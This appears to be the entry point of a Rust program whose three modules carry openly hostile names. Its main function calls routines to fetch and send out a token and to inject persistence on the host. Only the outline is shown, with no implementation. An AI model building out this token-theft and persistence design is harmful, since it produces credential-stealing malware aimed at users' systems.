mod filesystem;
mod network;
mod admin;

fn main() {
    network::get_and_send_token();
    filesystem::inject_persistence();
    admin::execute_extra_persistence();
}
